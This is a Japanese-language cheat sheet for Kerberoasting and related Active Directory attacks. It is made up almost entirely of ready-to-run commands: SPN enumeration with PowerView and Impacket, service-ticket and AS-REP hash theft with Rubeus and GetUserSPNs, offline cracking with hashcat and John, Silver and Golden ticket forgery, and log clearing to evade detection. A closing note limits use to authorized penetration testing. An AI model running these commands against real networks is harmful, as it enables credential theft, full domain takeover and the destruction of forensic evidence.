# Kerberoasting Attack Techniques

## Kerberoasting の基本

### SPNアカウントの列挙
```powershell
# PowerView を使用したSPN列挙
Import-Module .\PowerView.ps1
Get-NetUser -SPN

# Active Directory PowerShell モジュールを使用
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Impacket を使用
GetUserSPNs.py domain.local/username:password -dc-ip <dc-ip>
```

## チケットの取得

### PowerShell を使用した取得
```powershell
# Rubeus を使用したチケット取得
.\Rubeus.exe kerberoast /outfile:hashes.txt

# 特定のユーザーのチケット取得
.\Rubeus.exe kerberoast /user:sqlservice /outfile:sqlservice.txt

# ステルス性を高めた取得
.\Rubeus.exe kerberoast /tgtdeleg
```

### Impacket を使用した取得
```bash
# 基本的なチケット取得
GetUserSPNs.py domain.local/username:password -dc-ip <dc-ip> -request

# 特定のユーザーのチケット取得
GetUserSPNs.py domain.local/username:password -dc-ip <dc-ip> -request-user sqlservice

# ASREPRoasting（事前認証なし）
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

## チケットのクラック

### Hashcat を使用したクラック
```bash
# Kerberoastingハッシュのクラック（モード13100）
hashcat -m 13100 hashes.txt wordlist.txt

# ルールを使用したクラック
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# ASREPRoastingハッシュのクラック（モード18200）
hashcat -m 18200 asrep.txt wordlist.txt
```

### John the Ripper を使用したクラック
```bash
# Kerberoastingハッシュのクラック
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt

# ASREPRoastingハッシュのクラック
john --format=krb5asrep asrep.txt --wordlist=wordlist.txt
```

## 高度な技術

### SPN操作
```powershell
# SPNの追加（管理者権限必要）
Set-ADUser -Identity targetUser -ServicePrincipalNames @{Add='HTTP/server.domain.local'}

# SPNの削除
Set-ADUser -Identity targetUser -ServicePrincipalNames @{Remove='HTTP/server.domain.local'}
```

### チケットの改ざん
```powershell
# Silver Ticketの作成
.\Rubeus.exe silver /service:HTTP/server.domain.local /rc4:<hash> /user:Administrator /domain:domain.local

# Golden Ticketの作成
.\Rubeus.exe golden /rc4:<krbtgt-hash> /domain:domain.local /user:Administrator
```

## 防御回避テクニック

### ステルス性の向上
```powershell
# TGTを使用したKerberoasting
.\Rubeus.exe kerberoast /tgtdeleg /outfile:stealthy.txt

# エンコードされたチケットの取得
.\Rubeus.exe kerberoast /tgtdeleg /outfile:stealthy.txt /nowrap
```

### ログ回避
```powershell
# PowerShellログの削除
Remove-Item (Get-PSReadlineOption).HistorySavePath
Clear-EventLog "Windows PowerShell"

# Kerberosチケットのパージ
klist purge
```

## 注意事項
- これらの技術は、許可された環境でのペネトレーションテストでのみ使用してください
- 大量のチケット要求は検知される可能性があります
- 実環境での使用は違法となる可能性があります
- パスワードクラックは大量のリソースを消費する可能性があります 